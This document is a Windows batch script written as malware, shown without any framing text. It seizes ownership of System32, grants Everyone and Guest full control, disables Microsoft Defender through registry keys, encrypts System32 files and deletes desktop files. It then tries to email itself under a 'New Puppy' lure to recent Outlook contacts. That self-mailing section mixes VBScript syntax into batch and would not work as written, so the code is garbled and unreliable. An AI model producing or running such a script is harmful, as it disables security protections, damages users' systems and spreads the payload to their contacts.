Takeown /f C:\Windows\System32\
icacls "%SystemRoot%\system32" /grant:r "Everyone:(OI)(CI)F" "Guest:(OI)(CI)F"
@echo off
@echo off

REM Turn off Microsoft Defender functions
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f

REM Encrypt files in system32 using a random key
cd C:\Windows\System32
cipher /e /s /a

REM Delete all icons on the desktop
del %userprofile%\desktop\*.* /s /q

REM Set all apps to default
assoc .txt=txtfile
assoc .pdf=AcroExch.Document
assoc .jpg=jpegfile
assoc .png=pngfile
assoc .gif=giffile
assoc .mp3=mp3file
assoc .mp4=mp4file
assoc .avi=avifile
assoc .doc=word.Document.8
assoc .docx=word.Document.12
assoc .xls=Excel.Sheet.8
assoc .xlsx=Excel.Sheet.12
assoc .ppt=PowerPoint.Show.8
assoc .pptx=PowerPoint.Show.12

REM Create an Outlook email and attach the batch file to it
set outlookApp=Outlook.Application
set outlookNamespace=%outlookApp%.GetNameSpace("MAPI")
set email=%outlookApp%.CreateItem(0)
set attachment=%email%.Attachments.Add("%~f0")

REM Set email properties
email.Subject = "New Puppy"
email.Body = "I just got a new puppy!"

REM Blind carbon copy recent contacts
set recipients=%outlookNamespace%.CreateRecipient("recipient@example.com")
set reciplist=%email%.Recipients.Add(recipients)

set contacts=%outlookNamespace%.GetDefaultFolder(10)
set items=%contacts%.Items.Restrict("[MessageClass]='IPM.Contact' AND [LastModificationTime]>'" & dateadd("d", -30, now()) & "'")

for /f "tokens=1" %%a in ('cscript //nologo //e:vbscript "%temp%\tempscpt.vbs"') do (
  set recip=%outlookNamespace%.CreateRecipient("%%a")
  set reciplist=%email%.Recipients.Add(recip)
  reciplist.Type = 3
)

REM Send the email
email.Send

echo Done!
pause
